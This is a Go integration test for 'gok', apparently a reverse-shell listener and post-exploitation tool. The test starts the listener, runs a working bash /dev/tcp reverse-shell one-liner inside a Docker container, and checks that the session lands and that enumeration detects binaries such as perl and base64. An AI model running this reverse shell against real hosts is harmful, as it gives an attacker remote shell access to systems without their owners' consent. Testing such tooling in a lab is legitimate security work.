//go:build integration

package main

import (
  "fmt"
  "testing"
  "time"

  "github.com/smavl/gok/internal/cli"
  "github.com/smavl/gok/internal/core"
  "github.com/smavl/gok/internal/prober"
  "github.com/smavl/gok/internal/session"
  "github.com/stretchr/testify/require"
)

func TestRevshellSimple(t *testing.T) {
  // time start

  // start gok core 
  hostIP := "0.0.0.0"     // Bind gok to listen on all interfaces
  connectIP := "172.17.0.1" // Docker ip
  hostPort := 9001

  // Start gok core in headless/test mode
  probingCmdTimeout := 60 * time.Millisecond
  cfg := cli.Config{
    PortRange: cli.PortRange{ Ports: []int{hostPort} },
    BindIps:   []string{hostIP},
    // NOTE: Test/Headless mode
    HeadlessMode: true,
    // Should be enough for test environment
    ProbingCmdTimeout: probingCmdTimeout,
  }
  c := core.NewCore(cfg)
  go c.Start()

  // Start the test container
  tc := StartContainer(t, "ubuntu:22.04")

  // start revshell in test container
  revCmd := fmt.Sprintf("nohup bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &", connectIP, hostPort)
  _ , rerr := tc.Exec(t, []string{"bash", "-c", revCmd})
  if rerr != nil {
    t.Fatal(rerr)
  }


  // TEST: Session lands
  require.Eventually(t, func() bool {
    sessions := c.SessionManager.GetSessions()
    return len(sessions) == 1
  }, 1*time.Second, 2*time.Millisecond, "Expected one session to be established")


  // TEST: OS of Session should be Linux
  var s *session.Session
  var err error
  require.Eventually(t, func() bool {
    s, err = c.SessionManager.Get(0)
    if err != nil { return false }
    return s.SystemInfo.OS == prober.Linux
  }, 1*time.Second, 2*time.Millisecond, "Expected session OS to be Linux")


  // Wait for Prober to be initialized AND enumeration to complete (state = StateBackgrounded)
  require.Eventually(t, func() bool {
    return s.IsProberDone()
  }, 5*time.Second, 20*time.Millisecond, "Timed out waiting for Prober initialization and binary enumeration")


  // TEST: Binaries: `which`, `perl` should be detected
  // require.NoError(t, err)
  binaries := s.Prober.GetBinaries()
  require.Contains(t, binaries, "which", "Expected 'which' binary to be detected")
  require.Contains(t, binaries, "perl", "Expected 'perl' binary to be detected")
  require.Contains(t, binaries, "base64", "Expected 'base64' binary to be detected")
  require.Contains(t, binaries, "find", "Expected 'find' binary to be detected")
  require.Contains(t, binaries, "grep", "Expected 'grep' binary to be detected")
  // Does not not contain:
  require.NotContains(t, binaries, "nonexistentbinary123", "Did not expect 'nonexistentbinary123' binary to be detected")
  require.NotContains(t, binaries, "nc", "Did not expect 'nc' binary to be detected")

}

